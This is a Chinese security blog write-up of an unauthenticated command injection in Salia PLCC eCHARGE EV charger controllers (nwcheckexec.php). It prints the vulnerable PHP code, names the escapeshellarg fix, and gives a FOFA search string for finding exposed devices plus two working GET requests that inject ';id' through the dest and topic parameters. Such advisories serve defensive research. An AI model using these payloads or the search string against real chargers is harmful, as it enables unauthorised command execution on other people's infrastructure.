---
title: "Salia PLCC nwcheckexec.php 命令执行漏洞"
source: https://mrxn.net/jswz/salia-nwcheckexec-dest-topic-rce.html
asset_dir: assets/salia-plcc-nwcheckexec.php-命令执行漏洞
---

# Salia PLCC nwcheckexec.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/25 08:18
* 804浏览
* [0评论](#comment)
* 29分钟阅读

深入探索

软件

SQL

授权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Salia PLCC 的 eCHARGE 系列提供适用于家庭、企业和公共场所的智能电动汽车充电解决方案，具备高效充电、动态负载管理和光伏系统集成等功能的充电站。其充电管理系统 `nwcheckexec.php` 存在命令执行[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，未授权攻击者可利用该漏洞在设备上[执行任意系统命令](https://mrxn.net/tag/rce)。

# 影响版本

<2.0.4 版本

漏洞修复方案

# fofa语法

> `"Salia PLCC"`

# 漏洞分析

深入探索

SQL注入检测工具

VPN服务

Windows安全工具

看下 `nwcheckexec.php` 的业务逻辑实现，如下

```
<?php
    $dst = $_GET["dest"];
    $chk = $_GET["type"];
    $top = $_GET["topic"];
    $crt = $_GET["cert"];
    $cmd = '/srv/salia/nwcheck ';
    $x = "";

    if ($chk=="ping") {
       $x .= "=== PING ".$dst." ===".PHP_EOL;
       $cmd .= "-ping=".$dst;
    }
    if ($chk=="ntp") {
       $x .= "=== NTP ".$dst." ===".PHP_EOL;
       $cmd .= "-ntp=".$dst;
    }
    if ($chk=="dns") {
       $x .= "=== DNS RESOLVE ".$dst." ===".PHP_EOL;
       $cmd .= "-dns=".$dst;
    }
    if ($chk=="mqtt") {
       $x .= "=== MQTT ".$dst." ===".PHP_EOL;
       $x .= "topic: ".$top.PHP_EOL;
       $cmd .= "-mqtt=".$dst."::".$top;
    }
    if ($chk=="http") {
       $x .= "=== HTTP(S) ".$dst." ===".PHP_EOL;
       if (substr($dst,0,7)<>"http://" and substr($dst,0,8)<>"https://") {
          $dst = "http://".$dst;
       }
       $y = "";
       if ($crt=="false")
          $y = "-http=".$dst;
       else
          $y = "-https=".$dst;
       $cmd .= trim($y);
    }
    if ($chk=="neigh") {
       $x .= "=== IP NEIGH ===".PHP_EOL;
       $spl = shell_exec("ip neigh");
       $s = explode("\n", $spl);
       foreach ($s as $l) {
          if (trim($l)<>"") {
          if (strpos($l, " 00:01:87"))
             $x .= $l." ---- (Salia)".PHP_EOL;
          else if (strpos($l, " 00:D0:93"))
             $x .= $l." ---- (eCB1)".PHP_EOL;
          else
             $x .= $l.PHP_EOL;
          }
       }
       //$x .= shell_exec("ip neigh");
    } else {
       $res = shell_exec($cmd);
       if ($chk=="http") {
          $spl = str_split(strip_tags($res), 110);
          $rr = "";
          $xr = "";
          foreach ($spl as $txt)
             $rr .= $txt.PHP_EOL;
          for ($i=0;$i<100;$i++)
             $rr = str_replace("  "," ",$rr);
          $ar = explode("\n", $rr);
          foreach ($ar as $l) {
             if (trim($l)<>"")
             $xr .= trim($l);
          }
          $xxx = str_split($xr, 110);
          foreach ($xxx as $txt)
             $x .= $txt.PHP_EOL;
          //$x .= $rr;
       } else {
          $x .= $res;
       }
    }
    //$x .= $cmd;
    echo $x;
?>
```

`$cmd` 变量拼接了用户传入的 `$dst` 和 `$top` 参数，且直接传入 `shell_exec()` 执行。

根据 `$chk` 参数的不同值，拼接不同的命令参数，最终[执行任意系统命令](https://mrxn.net/tag/rce)，期间无任何过滤，造成命令注入漏洞。

网络安全

修复后的版本 增加了 `escapeshellarg` 方法对传入参数进行过滤。

[![Salia PLCC nwcheckexec.php 命令执行漏洞](images/img-001-70addc1c8655.webp)](https://image.mrxn.net/f488f0f314044ddea58894adaaf0abe5.webp)

# 漏洞复现

## `type=ping`

```
GET /nwcheckexec.php?type=ping&dest=8.8.8.8;id HTTP/1.1
Host: salia.mrxn.net
```

成功获得 `id` 命令执行结果

漏洞修复方案

[![Salia PLCC nwcheckexec.php 命令执行漏洞](images/img-002-157bc4e3f560.webp)](https://image.mrxn.net/80fa4e11f142479f8d3ea1230896551c.webp)

## `type=mqtt`

```
GET /nwcheckexec.php?type=mqtt&dest=127.0.0.1&topic=topicname;id HTTP/1.1
Host: salia.mrxn.net
```

成功获得 `id` 命令执行结果

代码安全审计

[![Salia PLCC nwcheckexec.php 命令执行漏洞](images/img-003-e470b9aac1f2.webp)](https://image.mrxn.net/33cd1696cda94bbab8bc3451e9700216.webp)

# 参考

* `https://www.onekey.com/resource/critical-vulnerabilities-in-ev-charging-stations-analysis-of-echarge-controllers`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.type=ping](#toc-5-1-)
* [5.2.type=mqtt](#toc-5-2-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[Salia PLCC nwcheckexec.php 命令执行漏洞](https://mrxn.net/jswz/salia-nwcheckexec-dest-topic-rce.html)  
文章链接：<https://mrxn.net/jswz/salia-nwcheckexec-dest-topic-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/salia-nwcheckexec-dest-topic-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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